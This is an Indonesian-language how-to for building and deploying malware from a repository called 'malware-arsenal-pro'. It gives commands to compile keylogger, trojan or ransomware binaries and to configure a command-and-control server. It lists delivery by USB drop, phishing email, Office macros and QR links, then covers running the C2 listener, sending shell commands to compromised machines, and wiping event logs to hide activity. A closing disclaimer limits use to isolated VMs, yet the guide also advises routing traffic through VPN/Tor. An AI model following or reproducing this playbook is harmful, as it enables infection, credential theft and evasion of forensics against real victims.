Cara Instal & Pasang Malware Code

1
Clone Repository Internal
git clone https://internal.zika.labs/malware-arsenal-pro.git
2
Masuk ke Direktori
cd malware-arsenal-pro
3
Install Dependencies
pip install -r requirements.txt
Daftar: pycryptodome, requests, pynput, psutil, scapy, pyinstaller, selenium, paramiko
4
Pilih Variant Malware
cd variants/
Lihat daftar: ls -la (ada 34 folder variant)
5
Konfigurasi C2 & Payload
nano config.json
Isi: IP_C2, PORT, ENCRYPT_KEY, PERSISTENCE_MODE, TARGET_OS
6
Build Binary (EXE/ELF)
python builder.py --variant keylogger --output payload.exe --platform windows
Ganti --variant dengan nama folder (trojan, ransomware, pdf_exploit, dsb)
7
Deploy ke Target
# Metode 1: USB Drop - copy payload.exe ke USB
# Metode 2: Email Phishing - lampirkan payload.exe
# Metode 3: Macro Office - embed payload
# Metode 4: QR Code - arahkan ke link download
Pastikan payload berjalan dengan hak administrator untuk persistence
8
Jalankan C2 Listener
python c2_server.py --port 443 --ssl --cert cert.pem
Akses dashboard: https://your-ip:8080 (login: admin / zika019)
9
Monitor Session
# CLI: task --list (lihat semua agent online)
# CLI: task --send shell:whoami (kirim perintah)
# Web: buka dashboard dan pilih session
10
Cleanup (Opsional)
./wipe_logs.sh # Linux
wipe_logs.bat # Windows
Menghapus event log dan jejak aktivitas
PERINGATAN: Hanya gunakan di lingkungan terisolasi (VM). Ganti key default zika019 segera. Gunakan VPN/Tor untuk semua traffic C2. Penulis tidak bertanggung jawab atas penyalahgunaan.
